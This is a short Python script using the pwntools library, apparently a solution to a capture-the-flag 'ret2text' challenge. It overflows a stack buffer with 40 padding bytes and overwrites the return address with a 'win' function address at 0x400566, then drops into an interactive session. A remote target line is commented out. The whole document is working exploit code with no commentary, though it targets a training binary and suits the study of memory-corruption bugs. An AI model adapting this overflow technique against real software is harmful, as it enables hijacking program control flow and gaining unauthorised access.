from pwn import *
context.log_level = "debug"
p = process("./ret2text")
#p = remote("127.0.0.1",5555)
win = 0x400566
p1 = "A"*40+p64(win) 

p.sendline(p1)
p.interactive()

